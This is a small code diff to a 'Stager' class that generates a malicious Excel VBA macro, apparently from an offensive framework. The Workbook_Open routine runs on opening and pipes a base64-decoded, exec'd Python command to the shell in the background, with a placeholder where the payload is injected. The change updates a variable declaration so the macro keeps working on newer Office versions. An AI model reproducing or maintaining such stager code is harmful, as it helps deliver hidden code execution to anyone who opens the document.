@@ -102,7 +102,11 @@ class Stager:
 #EndIf
 
 Private Sub Workbook_Open()
-    Dim result As Long
+    If Val(Application.Version) >= 15.33 Then
+        Dim result As LongPtr
+    Else
+        Dim result As Long
+    End If
     Dim cmd As String
     %s
     result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
